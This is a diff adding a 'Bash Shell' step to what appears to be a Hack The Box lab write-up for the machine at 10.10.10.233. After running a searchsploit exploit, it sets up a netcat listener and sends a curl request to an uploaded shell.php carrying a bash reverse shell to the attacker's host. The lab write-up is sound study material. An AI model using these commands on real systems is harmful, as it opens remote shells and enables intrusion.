@@ -116,3 +116,12 @@ root@kali# searchsploit -x php/webapps/44449.rb
 root@kali# ruby 44449.rb http://10.10.10.233
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a3f60b5-c3ef-4d41-a291-f752776f758b)
+
+Bash Shell
+```shell
+root@kali# rlwrap nc -nlvvp 443
+```
+```shell
+root@kali# curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.10/443 0>&1" 'http://10.10.10.233/shell.php'
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/868623ca-76ba-4fd4-bde1-6863c301137f)
